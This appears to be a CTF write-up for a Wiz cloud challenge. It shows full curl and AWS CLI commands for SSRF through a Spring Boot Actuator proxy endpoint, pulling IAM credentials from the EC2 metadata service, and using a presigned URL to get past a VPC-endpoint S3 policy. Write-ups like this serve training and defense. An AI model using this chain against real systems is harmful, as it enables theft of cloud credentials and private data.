---
title: "Perimeter Leak"
date: 2025-07-30
draft: false
description: "Writeup for the first Wiz Cloud Champions challenge: SSRF through a Spring Boot Actuator proxy endpoint into EC2 metadata, stolen IAM creds, and a presigned URL to get past a VPC-endpoint-only S3 policy"
tags: ["ctf", "cloud", "aws"]
aliases: ["/writeups/Wiz-Cloudsec/PerimeterLeak/"]
---

The first challenge opens with barely anything to go on:

```bash
You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
{"status":"UP"}
user@monthly-challenge:~$ 
```

So: a Spring Boot Actuator application. If you haven't run into one before, Actuator bolts a set of production-monitoring endpoints onto a Spring app: metrics, health checks, environment dumps, that kind of thing. Baeldung has a [solid rundown](https://www.baeldung.com/spring-boot-actuators) of what ships by default.

`/actuator/env` is the one worth hitting first. Curling it dumps the app's environment, including the S3 bucket name and a few details about the EC2 instance underneath it:

```bash
user@monthly-challenge:~$ curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq | grep -i bucket -A2 -B2
          "origin": "System Environment Property \"SHELL\""
        },
        "BUCKET": {
          "value": "challenge01-470XXXX",
          "origin": "System Environment Property \"BUCKET\""
        },
        "LOGNAME": {
```

`/actuator/mappings` is the other one worth checking; it lists every request mapping the application has, endpoints included.

One entry stands out: a proxy endpoint that takes a `url` parameter.

```json
{
              "predicate": "{ [/proxy], params [url]}",
              "handler": "challenge.Application#proxy(String)",
              "details": {
                "handlerMethod": {
                  "className": "challenge.Application",
                  "name": "proxy",
                  "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [
                    {
                      "name": "url",
                      "negated": false
                    }
                  ],
                  "patterns": [
                    "/proxy"
                  ],
                  "produces": []
                }
              }
            },
```

Knowing the app runs on EC2, the obvious next move is a GET to the 169.254 metadata server through that proxy. It works — but comes back unauthorized.

Fine. Ask the metadata server for a temporary token instead:

```bash
TOKEN=$(curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -XPUT https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token)

user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: ${TOKEN}" https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/   
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

Token in hand, next stop is the instance's IAM credentials:

```json
user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.meta-data/iam/security-credentials/challenge01-5592368

{
  "Code" : "Success",
  "LastUpdated" : "2025-09-06T12:38:55Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIARK7LBOHXNJ5AIPXX",
  "SecretAccessKey" : "EODTCiWkez2OTMwg3U0q+s1xc4HgB9YYpIS3XiqJ",
  "Token" : "IQ....",
  "Expiration" : "2025-09-06T18:59:09Z"
```

With those creds configured, the bucket opens up:

```bash
user@monthly-challenge:~$ aws s3 ls s3://challenge01-470fXXX --recursive
2025-06-18 17:15:24         29 hello.txt
2025-06-16 22:01:49         51 private/flag.txt
```

For a second there I thought that was it. It wasn't — pulling the object down locally throws a forbidden error:

```bash
user@monthly-challenge:~$ aws s3 cp s3://challenge01-XXX/private/flag.txt --profile p1 flag
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

The bucket policy explains why: nothing under `/private/*` leaves the bucket unless the request comes from VPC endpoint `vpce-0dfd8b6aa1642a0570`.

```bash
user@monthly-challenge:~$ aws s3api get-bucket-policy --profile p1 --bucket challenge01-470fXXX | jq
{
  "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470fXXX/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
}
```

That `/proxy` endpoint from `/actuator/mappings` earlier is exactly what's needed here — it lets requests originate from the EC2 instance itself, which sits on that same VPC.

So: presign a URL for the object, then fire it through `/proxy` so the request comes from inside the VPC instead of from me. First challenge, flag secured.

```bash
user@monthly-challenge:~$ URL=$(aws s3 presign s3://challenge01-470fXXXX/private/flag.txt --profile p1 | jq -sRr @uri)
user@monthly-challenge:~$ echo $URL
https%3A%2F%2Fchallenge01-470XXX.s3.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3DAWS4..
user@monthly-challenge:~$ curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=${URL} 
The flag is: WIZ_CTF_***********
```